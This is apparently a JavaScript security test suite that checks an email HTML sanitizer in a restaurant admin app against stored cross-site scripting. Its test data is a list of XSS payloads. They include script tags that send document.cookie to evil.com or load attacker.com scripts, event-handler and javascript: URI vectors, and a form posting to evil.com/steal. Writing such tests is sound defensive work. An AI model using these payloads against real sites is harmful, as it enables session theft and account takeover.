import { sanitizeEmailHtml, stripHtmlToText } from '../lib/sanitize-html.ts';
import fs from 'fs';
import path from 'path';

console.log('================================================================');
console.log('🛡️  H1 STORED XSS SECURITY AUDIT & VERIFICATION SUITE');
console.log('================================================================\n');

let passed = 0;
let failed = 0;

function assert(condition, message) {
    if (condition) {
        console.log(`  ✅ PASS: ${message}`);
        passed++;
    } else {
        console.error(`  ❌ FAIL: ${message}`);
        failed++;
    }
}

// -------------------------------------------------------------------------
// Category 1: Normal Email Content Displays Correctly
// -------------------------------------------------------------------------
console.log('--- Category 1: Normal Email Content Preservation ---');

const normalPasswordEmail = `
    <h3>Your password was successfully changed.</h3>
    <p><strong>Time:</strong> 2026-10-03 12:00:00 UTC</p>
    <p><strong>Device:</strong> MacBook Pro</p>
    <p><strong>Browser:</strong> Chrome 130</p>
    <p><strong>IP Address:</strong> 192.168.1.100</p>
    <p>If you did not perform this action, please contact your Restaurant Administrator immediately.</p>
`;
const sanitizedPasswordEmail = sanitizeEmailHtml(normalPasswordEmail);
assert(sanitizedPasswordEmail.includes('<h3>Your password was successfully changed.</h3>'), 'Preserves <h3> headings');
assert(sanitizedPasswordEmail.includes('<strong>Time:</strong>'), 'Preserves <strong> formatting');
assert(sanitizedPasswordEmail.includes('<p><strong>Device:</strong> MacBook Pro</p>'), 'Preserves <p> paragraphs');

const normalVerificationEmail = `
    <h3>Verify Your Email Address Change</h3>
    <p>A request was made to update your Dine In One registered email address. Click the link below:</p>
    <p><a href="https://dineinone.com/verify?token=abc-123-xyz">Verify Email Change</a></p>
    <p>Or copy this link to your browser:</p>
    <p>https://dineinone.com/verify?token=abc-123-xyz</p>
`;
const sanitizedVerificationEmail = sanitizeEmailHtml(normalVerificationEmail);
assert(sanitizedVerificationEmail.includes('<a href="https://dineinone.com/verify?token=abc-123-xyz"'), 'Preserves valid HTTPS link in <a>');
assert(sanitizedVerificationEmail.includes('target="_blank"'), 'Enforces target="_blank" for safe external navigation');
assert(sanitizedVerificationEmail.includes('rel="noopener noreferrer nofollow"'), 'Enforces rel="noopener noreferrer nofollow" to prevent tabnabbing');

// -------------------------------------------------------------------------
// Category 2: <script> Payloads Rendered Harmlessly
// -------------------------------------------------------------------------
console.log('\n--- Category 2: Script Tag Neutralization ---');

const scriptPayloads = [
    { name: 'Standard inline script', payload: '<script>alert("XSS")</script>' },
    { name: 'Uppercase script tag', payload: '<SCRIPT SRC="https://attacker.com/evil.js"></SCRIPT>' },
    { name: 'Mixed case script with body', payload: '<ScRiPt type="text/javascript">document.location="http://evil.com/?c="+document.cookie;</sCrIpT>' },
    { name: 'Nested script tags', payload: '<scr<script>ipt>alert(1)</script>' },
    { name: 'Script embedded inside paragraph', payload: '<p>Welcome back! <script>fetch("/api/admin/secrets")</script> Have a good day.</p>' }
];

for (const { name, payload } of scriptPayloads) {
    const cleaned = sanitizeEmailHtml(payload);
    assert(
        !cleaned.toLowerCase().includes('<script') && !cleaned.toLowerCase().includes('</script>'),
        `${name}: Script tag completely removed`
    );
    assert(
        !cleaned.includes('attacker.com') && !cleaned.includes('document.cookie') && !cleaned.includes('/api/admin/secrets'),
        `${name}: Executable malicious payload stripped`
    );
}

// -------------------------------------------------------------------------
// Category 3: Event Handler (onerror / onload) Payloads Blocked
// -------------------------------------------------------------------------
console.log('\n--- Category 3: Event-Handler Payloads Blocked ---');

const eventHandlerPayloads = [
    { name: 'Image with onerror', payload: '<img src="invalid_image.jpg" onerror="alert(document.cookie)">' },
    { name: 'SVG with onload', payload: '<svg onload="alert(\'SVG XSS\')"><circle cx="10" cy="10" r="5"/></svg>' },
    { name: 'Body with onload', payload: '<body onload="alert(1)">' },
    { name: 'Div with onmouseover', payload: '<div onmouseover="alert(\'hover XSS\')">Hover for reward!</div>' },
    { name: 'Anchor with onclick', payload: '<a href="#" onclick="alert(\'click XSS\')">Click here</a>' },
    { name: 'Input with autofocus onfocus', payload: '<input autofocus onfocus="alert(1)">' }
];

for (const { name, payload } of eventHandlerPayloads) {
    const cleaned = sanitizeEmailHtml(payload);
    assert(
        !cleaned.toLowerCase().includes('onerror') &&
        !cleaned.toLowerCase().includes('onload') &&
        !cleaned.toLowerCase().includes('onclick') &&
        !cleaned.toLowerCase().includes('onmouseover') &&
        !cleaned.toLowerCase().includes('onfocus'),
        `${name}: Event handler strictly eliminated`
    );
    assert(
        !cleaned.includes('alert('),
        `${name}: Function call stripped`
    );
}

// -------------------------------------------------------------------------
// Category 4: JavaScript URLs Blocked
// -------------------------------------------------------------------------
console.log('\n--- Category 4: Malicious Protocol & URL Schemes Blocked ---');

const maliciousUrlPayloads = [
    { name: 'javascript: URI', payload: '<a href="javascript:alert(document.cookie)">Claim Bonus</a>' },
    { name: 'Mixed case JavaScript: URI', payload: '<a href="JaVaScRiPt:alert(1)">Claim Bonus</a>' },
    { name: 'Spaces before javascript: URI', payload: '<a href="   javascript:alert(1)">Claim Bonus</a>' },
    { name: 'vbscript: URI', payload: '<a href="vbscript:msgbox(1)">Claim Bonus</a>' },
    { name: 'Data: URI with HTML payload', payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Claim</a>' }
];

for (const { name, payload } of maliciousUrlPayloads) {
    const cleaned = sanitizeEmailHtml(payload);
    assert(
        !cleaned.toLowerCase().includes('javascript:') &&
        !cleaned.toLowerCase().includes('vbscript:') &&
        !cleaned.toLowerCase().includes('data:text/html'),
        `${name}: Malicious URI scheme blocked`
    );
    assert(
        !cleaned.includes('alert(') && !cleaned.includes('PHNjcmlwdD5'),
        `${name}: Malicious code stripped`
    );
}

// -------------------------------------------------------------------------
// Category 5: Iframe / Object / Embed / Form Injection Blocked
// -------------------------------------------------------------------------
console.log('\n--- Category 5: Iframe, Object, Embed & Form Injection Blocked ---');

const containerPayloads = [
    { name: 'Iframe injection', payload: '<iframe src="https://phishing-site.com/login"></iframe>' },
    { name: 'Object injection', payload: '<object data="https://evil.com/exploit.swf"></object>' },
    { name: 'Embed injection', payload: '<embed src="https://evil.com/flash.swf">' },
    { name: 'Form hijacking injection', payload: '<form action="https://evil.com/steal"><input name="token" value="admin"><button>Click</button></form>' }
];

for (const { name, payload } of containerPayloads) {
    const cleaned = sanitizeEmailHtml(payload);
    assert(
        !cleaned.toLowerCase().includes('<iframe') &&
        !cleaned.toLowerCase().includes('<object') &&
        !cleaned.toLowerCase().includes('<embed') &&
        !cleaned.toLowerCase().includes('<form'),
        `${name}: Dangerous container tag stripped completely`
    );
    assert(
        !cleaned.includes('phishing-site.com') && !cleaned.includes('exploit.swf'),
        `${name}: Malicious target eliminated`
    );
}

// -------------------------------------------------------------------------
// Category 6: Safe Text Extraction
// -------------------------------------------------------------------------
console.log('\n--- Category 6: Safe Plain Text Rendering ---');

const mixedContent = '<h3>Alert:</h3><p>Your password was changed from <strong>Chrome</strong>.<br/>IP: 10.0.0.1</p>';
const text = stripHtmlToText(mixedContent);
assert(!text.includes('<h3>') && !text.includes('<strong>') && !text.includes('<p>'), 'Plain text contains no HTML tags');
assert(text.includes('Alert:') && text.includes('Chrome') && text.includes('10.0.0.1'), 'Plain text preserves all text information');

// -------------------------------------------------------------------------
// Category 7: Security Page Source Code Verification
// -------------------------------------------------------------------------
console.log('\n--- Category 7: Admin Security Page Implementation Check ---');

const securityPagePath = path.resolve('app/[restaurantCode]/admin/security/page.tsx');
const securityPageContent = fs.readFileSync(securityPagePath, 'utf8');

assert(
    !securityPageContent.includes('dangerouslySetInnerHTML={{ __html: email.body }}'),
    'Raw dangerouslySetInnerHTML on email.body is completely removed'
);
assert(
    securityPageContent.includes('<SafeEmailBody content={email.body} />') ||
    securityPageContent.includes('SafeEmailBody'),
    'SafeEmailBody component is integrated for email rendering'
);

// -------------------------------------------------------------------------
// Summary
// -------------------------------------------------------------------------
console.log('\n================================================================');
console.log(`TOTAL PASSED: ${passed} | TOTAL FAILED: ${failed}`);
console.log('================================================================\n');

if (failed > 0) {
    process.exit(1);
} else {
    console.log('🎉 ALL H1 STORED XSS SECURITY TESTS PASSED SUCCESSFULLY!');
}
